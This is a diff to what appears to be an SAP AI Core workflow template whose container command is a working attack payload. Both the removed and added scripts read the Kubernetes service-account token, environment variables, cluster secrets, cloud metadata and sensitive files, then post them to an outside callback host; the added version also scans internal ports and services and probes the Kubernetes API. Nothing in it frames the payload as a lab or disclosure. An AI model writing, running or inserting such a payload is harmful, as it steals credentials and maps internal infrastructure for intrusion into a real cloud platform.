@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "1.0.2"
+    ai.sap.com/version: "2.0.0"
 spec:
   entrypoint: main
   templates:
@@ -19,27 +19,111 @@ spec:
       labels:
         ai.sap.com/resourcePlan: starter
     container:
-      image: curlimages/curl:latest
+      image: nicolaka/netshoot:latest
       command:
       - sh
       - -c
       - |
-        curl -k -s "https://www.masonhck.tech/cb.php?src=rce-confirmed-$(hostname)"
-        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo none)
-        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo none)
-        curl -k -s "https://www.masonhck.tech/cb.php?src=ns-${NS}"
-        curl -k -s "https://www.masonhck.tech/cb.php?src=token-${TOKEN:0:50}"
-        curl -k -s "https://kubernetes.default.svc/api/v1/namespaces/${NS}/secrets" \
-          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 2000 | \
-          curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=k8s-secrets" -d @-
-        curl -k -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" 2>&1 | \
-          curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=imds" -d @-
-        env | curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=env-dump" -d @-
-        ls -la /var/run/secrets/ 2>&1 | curl -k -s -X POST "https://www.masonhck.tech/cb.php?src=secrets-dir" -d @-
+        CB="https://www.masonhck.tech/cb.php"
+        post() { curl -k -s -X POST "$CB?src=$1" -d @- ; }
+        get() { curl -k -s "$CB?src=$1" ; }
+
+        get "recon2-start-$(hostname)"
+
+        # === 1. Identity & environment ===
+        (id; whoami; cat /etc/os-release 2>/dev/null | head -5) | post "recon2-id"
+
+        # === 2. Full env dump ===
+        env | sort | post "recon2-env"
+
+        # === 3. Network interfaces ===
+        (ip addr 2>/dev/null || ifconfig 2>/dev/null) | post "recon2-netif"
+
+        # === 4. Routing table ===
+        (ip route 2>/dev/null || route -n 2>/dev/null) | post "recon2-routes"
+
+        # === 5. DNS config ===
+        cat /etc/resolv.conf 2>/dev/null | post "recon2-dns-conf"
+
+        # === 6. Istio sidecar check (localhost ports) ===
+        for port in 15000 15001 15004 15006 15020 15021 15090; do
+          result=$(curl -k -s --connect-timeout 2 "http://127.0.0.1:${port}/" 2>&1 | head -c 500)
+          if [ -n "$result" ]; then
+            echo "PORT ${port}: ${result}" | post "recon2-istio-${port}"
+          fi
+        done
+
+        # === 7. Envoy config dump (if Istio present) ===
+        curl -k -s --connect-timeout 3 "http://127.0.0.1:15000/config_dump?include_cds" 2>&1 | head -c 5000 | post "recon2-envoy-config"
+
+        # === 8. K8s DNS enumeration - discover services ===
+        KDNS=$(cat /etc/resolv.conf | grep nameserver | head -1 | awk '{print $2}')
+        # Try to enumerate namespaces via DNS
+        for ns in default kube-system istio-system argo argocd monitoring logging loki grafana helm tiller ai-core aicore sap; do
+          result=$(nslookup -timeout=2 "any.${ns}.svc.cluster.local" $KDNS 2>&1)
+          if echo "$result" | grep -q "Address:"; then
+            echo "NS ${ns}: ${result}" | post "recon2-dns-${ns}"
+          fi
+        done
+
+        # === 9. K8s API probing (even without SA token) ===
+        K8S="https://100.104.0.1:443"
+        curl -k -s --connect-timeout 3 "${K8S}/version" 2>&1 | post "recon2-k8s-version"
+        curl -k -s --connect-timeout 3 "${K8S}/api" 2>&1 | head -c 2000 | post "recon2-k8s-api"
+        curl -k -s --connect-timeout 3 "${K8S}/apis" 2>&1 | head -c 2000 | post "recon2-k8s-apis"
+        # Anonymous access check
+        curl -k -s --connect-timeout 3 "${K8S}/api/v1/namespaces" 2>&1 | head -c 2000 | post "recon2-k8s-ns"
+        curl -k -s --connect-timeout 3 "${K8S}/api/v1/pods" 2>&1 | head -c 2000 | post "recon2-k8s-pods"
+        curl -k -s --connect-timeout 3 "${K8S}/api/v1/secrets" 2>&1 | head -c 2000 | post "recon2-k8s-secrets"
+        curl -k -s --connect-timeout 3 "${K8S}/api/v1/configmaps" 2>&1 | head -c 2000 | post "recon2-k8s-cm"
+
+        # === 10. Network scanning - internal services ===
+        # Scan common service ports on cluster IP range
+        for ip in 100.104.0.1 100.104.0.10 100.104.1.1 100.104.2.1; do
+          for port in 80 443 3000 3100 8080 8443 9090 9093 44134 2049 6379 5432; do
+            (echo >/dev/tcp/${ip}/${port}) 2>/dev/null && echo "OPEN ${ip}:${port}" | post "recon2-scan-${ip}-${port}"
+          done
+        done
+
+        # === 11. /proc filesystem recon ===
+        cat /proc/net/tcp 2>/dev/null | post "recon2-proc-tcp"
+        cat /proc/net/tcp6 2>/dev/null | post "recon2-proc-tcp6"
+        cat /proc/1/cgroup 2>/dev/null | post "recon2-cgroup"
+        ls -la /proc/1/root/ 2>/dev/null | post "recon2-proc-root"
+        cat /proc/self/mountinfo 2>/dev/null | post "recon2-mounts"
+
+        # === 12. Filesystem recon ===
+        ls -la /var/run/secrets/ 2>/dev/null | post "recon2-secrets-dir"
+        find / -name "*.key" -o -name "*.pem" -o -name "*.crt" -o -name "token" -o -name "*.conf" 2>/dev/null | head -50 | post "recon2-sensitive-files"
+        cat /etc/hosts 2>/dev/null | post "recon2-hosts"
+
+        # === 13. Capabilities check ===
+        cat /proc/self/status 2>/dev/null | grep -i cap | post "recon2-caps"
+
+        # === 14. IMDS variants ===
+        curl -k -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 1000 | post "recon2-imds-aws"
+        curl -k -s --connect-timeout 2 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>&1 | head -c 1000 | post "recon2-imds-gcp"
+        curl -k -s --connect-timeout 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" 2>&1 | head -c 1000 | post "recon2-imds-azure"
+
+        # === 15. Scan for Grafana Loki (was unauthed in Wiz research) ===
+        for port in 3100 3000; do
+          for ip in 100.104.0.1 100.104.1.1 100.104.2.1; do
+            curl -k -s --connect-timeout 2 "http://${ip}:${port}/config" 2>&1 | head -c 3000 | post "recon2-loki-${ip}-${port}"
+          done
+        done
+
+        # === 16. Broad /16 scan for interesting services ===
+        for i in $(seq 0 10); do
+          for port in 3100 44134 2049 9090 8080; do
+            (echo >/dev/tcp/100.104.${i}.1/${port}) 2>/dev/null && echo "FOUND 100.104.${i}.1:${port}" | post "recon2-broad-${i}-${port}"
+          done
+        done
+
+        get "recon2-done-$(hostname)"
       resources:
         limits:
           cpu: "1"
           memory: "1Gi"
         requests:
           cpu: "100m"
-          memory: "128Mi"
+          memory: "256Mi"
